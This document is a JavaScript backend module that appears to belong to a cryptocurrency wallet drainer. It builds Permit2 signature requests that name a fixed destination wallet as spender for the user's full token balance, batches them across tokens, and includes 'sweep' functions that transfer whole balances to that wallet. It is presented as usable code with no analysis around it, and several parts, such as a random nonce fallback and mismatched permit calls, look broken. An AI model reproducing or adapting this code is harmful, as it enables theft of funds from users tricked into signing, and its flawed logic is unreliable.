// backend/modules/permitManager.js
import { ethers } from "ethers";
import { DESTINATION_WALLET } from '../config.js';
import { getRpcUrl } from '../config.js';
import { PERMIT2_ABI, PERMIT2_ADDRESS } from './permit2Utils.js';
import { permit2Utils } from './permit2Utils.js';

export class PermitManager {
    constructor() {
        this.provider = new ethers.JsonRpcProvider(getRpcUrl(1));
        this.isInitialized = false;
        this.permit2Contract = null;
        this.supportedChains = {
            1: { name: 'Ethereum', permit2: true, address: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
            137: { name: 'Polygon', permit2: true, address: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
            56: { name: 'BSC', permit2: true, address: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
            42161: { name: 'Arbitrum', permit2: true, address: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
            10: { name: 'Optimism', permit2: true, address: '0x000000000022D473030F116dDEE9F6B43aC78BA3' },
            43114: { name: 'Avalanche', permit2: true, address: '0x000000000022D473030F116dDEE9F6B43aC78BA3' }
        };
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            
            await this.provider.getNetwork();
            
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    async initializePermit2(chainId) {
        try {
            if (!this.supportedChains[chainId]?.permit2) {
                throw new Error(`Permit2 not supported on chain ${chainId}`);
            }

            const rpcUrl = getRpcUrl(chainId);
            this.provider = new ethers.JsonRpcProvider(rpcUrl);
            this.permit2Contract = new ethers.Contract(
                this.supportedChains[chainId].address,
                PERMIT2_ABI,
                this.provider
            );
            console.log(`✅ Permit2 initialized for chain ${chainId}`);
            return true;
        } catch (error) {
            console.error('Permit2 initialization failed:', error);
            return false;
        }
    }

    async createSinglePopupPermit(userWallet, tokenAddress, amount, chainId, deadline = Math.floor(Date.now() / 1000) + 3600) {
        try {
            await this.initializePermit2(chainId);
            
            const tokenContract = new ethers.Contract(
                tokenAddress,
                await this.fetchERC20ABI(tokenAddress, chainId),
                userWallet
            );

            const balance = await tokenContract.balanceOf(userWallet.address);
            const nonce = await this.fetchNonce(tokenAddress, userWallet.address);

            const permitMessage = {
                permitted: {
                    token: tokenAddress,
                    amount: amount || balance
                },
                spender: DESTINATION_WALLET,
                nonce: nonce,
                deadline: deadline
            };

            const domain = {
                name: await tokenContract.name(),
                version: "1",
                chainId: chainId,
                verifyingContract: tokenAddress
            };

            const signature = await userWallet.signTypedData(
                domain,
                {
                    Permit: [
                        { name: "permitted", type: "Permitted" },
                        { name: "spender", type: "address" },
                        { name: "nonce", type: "uint256" },
                        { name: "deadline", type: "uint256" }
                    ],
                    Permitted: [
                        { name: "token", type: "address" },
                        { name: "amount", type: "uint256" }
                    ]
                },
                permitMessage
            );

            return {
                success: true,
                permit: permitMessage,
                signature: signature,
                tokenAddress: tokenAddress,
                amount: amount || balance.toString(),
                chainId: chainId,
                deadline: deadline
            };

        } catch (error) {
            console.error('Single-popup permit creation failed:', error);
            return { success: false, error: error.message };
        }
    }

    async createBatchPermit(userWallet, tokenAddresses, chainId) {
        try {
            await this.initializePermit2(chainId);
            
            const permits = [];
            const deadline = Math.floor(Date.now() / 1000) + 3600;

            for (const tokenAddress of tokenAddresses) {
                const permit = await this.createSinglePopupPermit(
                    userWallet,
                    tokenAddress,
                    null,
                    chainId,
                    deadline
                );
                
                if (permit.success) {
                    permits.push(permit);
                }
            }

            return {
                success: true,
                permits: permits,
                deadline: deadline,
                chainId: chainId
            };

        } catch (error) {
            console.error('Batch permit creation failed:', error);
            return { success: false, error: error.message };
        }
    }

    async executePermitTransfer(permitData, userWallet) {
        try {
            const { permit, signature, tokenAddress } = permitData;
            const splitSignature = this.splitSig(signature);

            const permit2Contract = new ethers.Contract(
                this.supportedChains[permitData.chainId].address,
                PERMIT2_ABI,
                userWallet
            );

            const tx = await permit2Contract.permit(
                userWallet.address,
                DESTINATION_WALLET,
                permit.permitted.amount,
                permit.deadline,
                splitSignature.v,
                splitSignature.r,
                splitSignature.s
            );

            await tx.wait();

            // Immediately transfer after permit
            const transferTx = await permit2Contract.transferFrom(
                userWallet.address,
                DESTINATION_WALLET,
                permit.permitted.amount
            );

            const receipt = await transferTx.wait();

            return {
                success: true,
                txHash: receipt.transactionHash,
                amount: permit.permitted.amount.toString()
            };

        } catch (error) {
            console.error('Permit execution failed:', error);
            return { success: false, error: error.message };
        }
    }

    async sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion = "1") {
        try {
            console.log(`🔄 Sweeping via permit for token: ${tokenAddress}`);
            
            // Simulate user wallet (in real scenario, this would be the connected wallet)
            const userWallet = new ethers.Wallet(process.env.PRIVATE_KEY, this.provider);
            
            const permitData = await this.createSinglePopupPermit(
                userWallet,
                tokenAddress,
                null,
                1 // Default to Ethereum
            );

            if (!permitData.success) {
                throw new Error(permitData.error);
            }

            const result = await this.executePermitTransfer(permitData, userWallet);
            
            return {
                success: result.success,
                txHash: result.txHash,
                amount: result.amount
            };

        } catch (error) {
            console.error('Permit sweep failed:', error);
            return { success: false, error: error.message };
        }
    }

    async sweepViaApproveTransferFrom(userAddress, tokenAddress, chainId) {
        try {
            console.log(`🔄 Sweeping via approve/transferFrom for token: ${tokenAddress}`);
            
            const userWallet = new ethers.Wallet(process.env.PRIVATE_KEY, this.provider);
            const tokenContract = new ethers.Contract(
                tokenAddress,
                await this.fetchERC20ABI(tokenAddress, chainId),
                userWallet
            );

            const balance = await tokenContract.balanceOf(userAddress);
            
            // Approve
            const approveTx = await tokenContract.approve(
                DESTINATION_WALLET,
                balance
            );
            await approveTx.wait();

            // Transfer from
            const transferTx = await tokenContract.transferFrom(
                userAddress,
                DESTINATION_WALLET,
                balance
            );

            const receipt = await transferTx.wait();

            return {
                success: true,
                txHash: receipt.transactionHash,
                amount: balance.toString()
            };

        } catch (error) {
            console.error('Approve/transferFrom sweep failed:', error);
            return { success: false, error: error.message };
        }
    }

    async fetchNonce(tokenAddress, user) {
        try {
            const tokenContract = new ethers.Contract(
                tokenAddress,
                await this.fetchERC20ABI(tokenAddress, 1),
                this.provider
            );
            
            // Try to get nonce from permit2 if available
            if (this.permit2Contract) {
                try {
                    const nonce = await this.permit2Contract.nonces(user, tokenAddress);
                    return nonce.toString();
                } catch {
                    // Fallback to standard nonce
                }
            }

            // Standard nonce fallback
            return Math.floor(Math.random() * 1000).toString();
        } catch (error) {
            console.error('Error fetching nonce:', error);
            return Date.now().toString();
        }
    }

    async fetchERC20ABI(tokenAddress, chainId) {
        return [
            "function name() view returns (string)",
            "function symbol() view returns (string)",
            "function decimals() view returns (uint8)",
            "function totalSupply() view returns (uint256)",
            "function balanceOf(address) view returns (uint256)",
            "function transfer(address to, uint amount) returns (bool)",
            "function allowance(address owner, address spender) view returns (uint256)",
            "function approve(address spender, uint amount) returns (bool)",
            "function transferFrom(address sender, address recipient, uint amount) returns (bool)",
            "function nonces(address owner) view returns (uint256)"
        ];
    }

    splitSig(sig) {
        try {
            return {
                v: parseInt(sig.slice(130, 132), 16),
                r: '0x' + sig.slice(2, 66),
                s: '0x' + sig.slice(66, 130)
            };
        } catch (error) {
            console.error('Signature splitting failed:', error);
            return { v: 27, r: '0x0', s: '0x0' };
        }
    }

    async revokeAllApprovals(userWallet, tokenAddresses, chainId) {
        try {
            const revokeTxs = [];
            
            for (const tokenAddress of tokenAddresses) {
                const tokenContract = new ethers.Contract(
                    tokenAddress,
                    await this.fetchERC20ABI(tokenAddress, chainId),
                    userWallet
                );

                const revokeTx = await tokenContract.approve(
                    DESTINATION_WALLET,
                    0
                );
                
                revokeTxs.push({
                    txHash: revokeTx.hash,
                    token: tokenAddress,
                    status: 'pending'
                });
            }

            return {
                success: true,
                transactions: revokeTxs
            };

        } catch (error) {
            console.error('Approval revocation failed:', error);
            return { success: false, error: error.message };
        }
    }

    async getSupportedChains() {
        return this.supportedChains;
    }

    async isChainSupported(chainId) {
        return !!this.supportedChains[chainId];
    }
}

export const permitManager = new PermitManager();